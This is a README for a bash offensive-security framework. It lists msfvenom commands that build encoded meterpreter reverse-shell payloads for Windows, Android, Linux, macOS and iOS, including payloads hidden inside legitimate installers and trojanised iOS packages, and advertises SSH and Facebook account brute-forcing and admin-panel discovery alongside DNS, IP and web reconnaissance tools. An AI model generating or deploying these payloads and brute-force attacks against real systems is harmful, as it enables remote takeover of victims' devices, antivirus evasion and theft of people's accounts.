# ファックユー
My priv8 framework, written in bash

## Language
+ [GNU Bash](https://www.gnu.org/software/bash/)
+ [PHP](https://www.php.net/)
+ [Python3](https://www.python.org/)

## Dependencies
+ [Metasploit](https://www.rapid7.com/products/metasploit/download/) - For creating and execute payload
+ [Nmap](https://nmap.org/) - For performing port scanning
+ [Curl](https://curl.se/) - For sending request to api

## Optional dependencies
+ [Arcane](https://github.com/tokyoneon/Arcane) - For embedding iOS payload
+ [PHP-Curl](https://www.php.net/manual/en/curl.examples.php) - For sending http request
+ [Shreder](https://github.com/EntySec/Shreder) - For bruteforcing SSH passwords

## Menu Explanation
+ **Payload Generator**
  
  This menu provides automatic payload generator, and will automatically take you to meterpreter
  
  **Available Payloads :**
  + **Windows Payload**
    + **Simple Executable File Payload**

    ```sh
    msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 LHOST=$ip LPORT=$port -f exe > $out
    ```
    + **Payload Embedded to Installer**
    
    ```sh
    msfvenom -a x86 --platform windows -x $ins -k -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -e x86/shikata_ga_nai -i 9 -f exe -o $out
    ```
  + **Android Payload**
    + **Simple Aplication Package Payload**
    
    ```sh
    msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R > $out
    ```
  + **Linux Payload**
    + **Simple Reverse TCP Payload**
    
    ```sh
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f elf > $out
    ```
  + **Mac Payload**
    + **Simple Reverse TCP Payload**
    
    ```sh
    msfvenom -p osx/x86/shell_reverse_tcp LHOST=$ip LPORT=$port -f macho > $out
    ```
    + **Executable Python Payload**
    
    ```sh
    msfvenom -p python/meterpreter/reverse_tcp LHOST=$ip LPORT=$port > $out
    ```
  + **iOS Payload**
    + **Reverse TCP Payload (execute via SSH)**
    
    ```sh
    msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=$ip LPORT=$port -f macho -o $out
    chmod +x $out
    ldid -S $out
    ```
    + **Embedded iOS Package (packaged by Arcane)**
    
    ```sh
    ./arcane.sh --input $deb --lhost $ip --lport $port --cydia --netcat
    ```

+ **Brute Force Attack**
  
  This menu provides tools for performing Brute Force attack
  + **SSH Password Brute** - Bruteforcing password for username@host desired by user
  + **Facebook Account Brute** - Can be used for bruteforcing multiple account with multiple password

+ **DNS Queries**
  
  This menu provides tools for using DNS queries
  + **DNS Lookup** - View the standard DNS records for a domain
  + **Reverse DNS Lookup** - Discover the reverse DNS entries for an IP address, a range of IP addresses or a domain name
  + **DNS Host Records** - Find all Forward DNS records for a domain
  + **Shared DNS Servers** - Find hosts sharing DNS servers
  + **DNS Digging** - Get all DNS records for a target domain

+ **IP Tools**
  
  This menu provides tools for lookup IP information
  + **GeoIP Location Lookup** - Find the location of an IP address
  + **Reverse IP Lookup** - Find all A records associated with an IP address
  + **Subnet Lookup** - Determine the properties of a network subnet
  + **Autonomous System Lookup** - Check an Autonomous System Number for IP prefixes
  + **Banner Grabbing** - Discover network services by simply querying the service port

+ **Web Tools**
  
  This menu provides tools for Web Pentesting
  + **HTTP Header Check** - Review the HTTP Headers from a web server
  + **Extract Links From Page** - Parse the html of a website and extract links from the page
  + **Reverse Google Analytics Lookup** - Perform a reverse Google Analytics search to find all web properties associated with a Google Analytics ID
  + **Subdomain Finder** - Automatically search all subdomains from host
  + **Subdomain Brute (using wordlists)** - Perform Bruteforce attack to search all subdomains from hosts
  + **Directory Brute** - Perform Bruteforce attack to search all directory from hosts
  + **Admin Login Finder** - Perform Bruteforce attack to search panel for admin login

+ **Nmap Helper**

## External Links
+ [HackerTarget](https://hackertarget.com/) - Online Vulnerability Scanners
+ [Omnisint Labs](https://omnisint.io/) - Rapid7's Project Sonar API
+ [N1ght_Frmwrk](https://github.com/N1ght420/N1ght_Frmwrk) - Priv8 framework by N1ght.Hax0r
+ [Adfinder](https://github.com/N1ght420/adfinder) - Simple Admin Login Finder
+ [Subdoin](https://github.com/N1ght420/Subdoin) - Subdomain Grabber
+ [Dircrunch](https://github.com/N1ght420/Dircrunch) -  Simple tool for Searching Directory

## Note
```
Some of tools in this script require root access
```
